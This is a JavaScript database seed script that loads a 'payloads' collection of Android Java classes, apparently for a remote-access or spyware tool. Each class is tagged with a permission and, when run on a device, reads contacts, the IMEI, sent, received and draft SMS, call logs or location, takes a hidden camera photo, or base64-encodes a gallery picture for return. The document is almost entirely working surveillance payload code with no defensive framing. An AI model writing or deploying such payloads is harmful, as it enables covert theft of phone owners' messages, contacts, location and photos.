let dump = [
    {
        "_id" : "5ec26c30b5020e3ff0592a5f",
        "vulnerabilities" : [],
        "name" : "Test",
        "description" : "test",
        "content" : "import android.util.Log;\nimport android.content.Context;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n    \tLog.d(\"TAG_HACK\", \"Hacked\");\n      \treturn \"Hacked!\";\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3d256a8504d2f00bd6b4d",
        "vulnerabilities" : [
            "android.permission.READ_CONTACTS"
        ],
        "name" : "Read Contacts",
        "description" : "Read all contacts",
        "content" : "import android.content.ContentResolver;\nimport android.content.Context;\nimport android.database.Cursor;\nimport android.provider.ContactsContract;\nimport java.util.ArrayList;\n\nclass RuntimeClass {\n\tpublic RuntimeClass() {}\n  \n\tpublic String run(Context context) {\n    \tArrayList contactList = new ArrayList();\n\n      \tContentResolver cr = context.getContentResolver();\n      \tString[] projection = new String[] {\"display_name\", \"data1\"};\n\n      \tCursor c = cr.query(ContactsContract.Data.CONTENT_URI, projection, null, null, null);\n\n        if (c != null && c.getCount() > 0 ) {\n        \tc.moveToFirst();\n            do {\n                contactList.add( c.getString(c.getColumnIndex(\n                        ContactsContract.CommonDataKinds.Phone.NUMBER) ));\n            } while (c.moveToNext());\n        }\n\n        String contactListStringed = contactList.toString();\n        return contactListStringed;\n\t}\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3d40fc7f0f04d44470239",
        "vulnerabilities" : [
            "android.permission.READ_PHONE_STATE"
        ],
        "name" : "IMEI",
        "description" : "Read IMEI",
        "content" : "import android.content.Context;\nimport android.telephony.TelephonyManager;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n  \t\n \tpublic String run(Context context) {\n    \tTelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);\n\t\treturn telephonyManager.getDeviceId();\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3e28b8e0bb29b14a23dfc",
        "vulnerabilities" : [
            "android.permission.READ_SMS"
        ],
        "name" : "Read SMS sent",
        "description" : "Read SMS sent",
        "content" : "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/sent\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) {\n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS sent\";\n        }\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3e2c78e0bb29b14a23dfd",
        "vulnerabilities" : [
            "android.permission.READ_SMS"
        ],
        "name" : "Read SMS received",
        "description" : "Read SMS received",
        "content" : "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/inbox\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS recived\";\n        }\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3e2ca8e0bb29b14a23dfe",
        "vulnerabilities" : [
            "android.permission.READ_SMS"
        ],
        "name" : "Read SMS draft",
        "description" : "Read SMS draft",
        "content" : "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://sms/draft\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String msgData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    msgData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return msgData;\n        } else {\n            return \"No SMS draft\";\n        }\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3edf60188357e9839ce25",
        "vulnerabilities" : [
            "android.permission.READ_CALL_LOG"
        ],
        "name" : "Phone Calls",
        "description" : "Phone Calls",
        "content" : "import android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        Cursor cursor = context.getContentResolver().query(Uri.parse(\"content://call_log/calls\"), null, null, null, null);\n\n        if (cursor.moveToFirst()) { \n            String callData = \"\";\n            do {\n                for(int idx=0;idx<cursor.getColumnCount();idx++){\n                    callData += \" \" + cursor.getColumnName(idx) + \":\" + cursor.getString(idx);\n                }\n            } while (cursor.moveToNext());\n\n            return callData;\n        } else {\n            return \"No call\";\n        }\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ec3f3d859639880ccb635dd",
        "vulnerabilities" : [
            "android.permission.ACCESS_FINE_LOCATION"
        ],
        "name" : "Last last known location by network",
        "description" : "Last last known location by network",
        "content" : "import android.content.Context;\nimport android.location.Location;\nimport android.location.LocationManager;\n\nclass RuntimeClasse {\n  \tpublic RuntimeClasse() {}\n  \n \tpublic String run(Context context) {\n        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);\n        Location location = locationManager.getLastKnownLocation(\"network\");\n        return location.toString();\n    }\n}",
        "resultType" : "string",
        "__v" : 0.0
    },{
        "_id" : "5ed2559ba6229f00255310f5",
        "vulnerabilities" : [
            "android.permission.CAMERA"
        ],
        "name" : "Camera",
        "description" : "camera",
        "content" : "import android.content.Context;\nimport android.hardware.Camera;\nimport android.graphics.Bitmap;\nimport android.graphics.BitmapFactory;\n\nimport android.graphics.SurfaceTexture;\nimport android.util.Base64;\nimport android.util.Log;\nimport android.widget.ImageView;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\n\n\nclass RuntimeClass {\n        public RuntimeClass(){}\n\n        public String run() {\n            try {\n                Camera cam = Camera.open(0);\n                SurfaceTexture surfaceTexture = new SurfaceTexture(0);\n\n                cam.setPreviewTexture(surfaceTexture);\n                cam.startPreview();\n                cam.takePicture(null, null, new MyPictureCallBack());\n            } catch  (Exception ex) {\n                Log.d(\"CAM\", \"Can't take picture!\");\n            }\n\n            return \"Pic\";\n        }\n\n        class MyPictureCallBack implements Camera.PictureCallback {\n\n            public void onPictureTaken(byte[] data, Camera camera) {\n                BitmapFactory.Options bfo = new BitmapFactory.Options();\n                bfo.inPreferredConfig = Bitmap.Config.RGB_565;\n                Bitmap bitmap = BitmapFactory.decodeStream(new ByteArrayInputStream(data), null, bfo);\n                camera.stopPreview();\n                camera.release();\n\n                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n                bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);\n                byte[] byteArray = byteArrayOutputStream.toByteArray();\n                Log.d(\"CAM\", Base64.encodeToString(byteArray, Base64.DEFAULT));\n            }\n        }\n    }",
        "resultType" : "string",
        "__v" : 0
    },{
        "_id" : "5ed390ab2524b20025e7b0ea",
        "vulnerabilities" : [
            "android.permission.READ_EXTERNAL_STORAGE"
        ],
        "name" : "Pics from storage",
        "description" : "Pics from storage",
        "content" : "import android.content.Context;\nimport android.os.Environment;\nimport android.util.Base64;\nimport android.util.Log;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.util.Arrays;\nimport java.io.FileInputStream;\n\nimport android.graphics.Bitmap;\nimport android.graphics.BitmapFactory;\n\nclass RuntimeClass {\n  public RuntimeClass() {}\n\n  public String run(Context context) {\n        try {\n            File cameraDir = Environment.getExternalStorageDirectory();\n            File picsDir = new File(cameraDir, \"/DCIM/Camera\");\n            Log.d(\"Files\", picsDir.toString());\n            String[] pics = picsDir.list();\n            Log.d(\"Files\", Arrays.toString(pics));\n            if(pics != null && pics.length > 0) {\n                File firstPic = new File(picsDir.getAbsoluteFile(), pics[0]);\n              \tBitmap bitmap = BitmapFactory.decodeFile(firstPic.getAbsolutePath());\n              \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);\n                byte[] buffer = baos.toByteArray();\n                String a = Base64.encodeToString(buffer, Base64.DEFAULT);\n              \tString aL = String.valueOf(a.length());\n              \tLog.d(\"TAG\", aL);\n              \treturn a;\n            }\n        } catch (Exception e) { }\n\n\n        return \"No pics\";\n    }\n}",
        "resultType" : "image",
        "__v" : 0
    }
];

db.payloads.drop();
db.payloads.insertMany(dump);


